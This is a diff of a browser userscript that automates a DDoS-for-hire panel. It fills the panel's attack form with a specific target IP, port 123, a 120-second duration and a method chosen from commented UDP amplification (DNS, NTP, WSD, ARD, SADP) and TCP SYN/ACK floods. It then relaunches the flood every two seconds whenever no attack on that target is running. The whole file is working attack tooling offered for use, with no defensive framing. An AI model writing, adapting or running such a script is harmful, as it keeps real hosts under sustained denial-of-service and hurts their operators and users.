@@ -9,11 +9,48 @@
 // @grant        none
 // ==/UserScript==
 
-var autoddos = setInterval(function (){
-    document.getElementById("hostL4").value = "103.222.255.36";
-    document.getElementById("portL4").value = "123";
-    document.getElementById("timeL4").value = "120";
-    document.getElementById("methodL4").selectedIndex = 1;
+
+//UDP
+// index 0 = DNS 53
+// index 1 = NTP 123
+// index 2 = WSD 3702
+// index 3 = ARD 3283
+// index 4 = SADP37020
+//TCP
+// index 5 = SYN
+// index 6 = ACK
+
+var iptarget1="103.222.255.36";
+var porttarget1="123";
+var waktu1="120";
+var methode1="2"
+
+var iptarget2="103.222.255.36";
+var porttarget2="123";
+var waktu2="120";
+var methode2="1"
+
+var autoddos1 = setInterval(function (){
+    if(document.getElementsByClassName("table mb-0")[0].getElementsByTagName("tbody")[0].textContent.includes(iptarget1)||iptarget1 ==""){
+        return
+    }
+    document.getElementById("hostL4").value = iptarget1
+    document.getElementById("portL4").value = porttarget1
+    document.getElementById("timeL4").value = waktu1
+    document.getElementById("methodL4").selectedIndex = methode1
+    if(document.getElementById("attacksinprogress").textContent.length == 0){
+        L4btn('flood', '');
+    }
+},2000)
+
+var autoddos2 = setInterval(function (){
+    if(document.getElementsByClassName("table mb-0")[0].getElementsByTagName("tbody")[0].textContent.includes(iptarget2)||iptarget2 ==""){
+        return
+    }
+    document.getElementById("hostL4").value = iptarget2
+    document.getElementById("portL4").value = porttarget2
+    document.getElementById("timeL4").value = waktu2
+    document.getElementById("methodL4").selectedIndex = methode2
     if(document.getElementById("attacksinprogress").textContent.length == 0){
         L4btn('flood', '');
     }
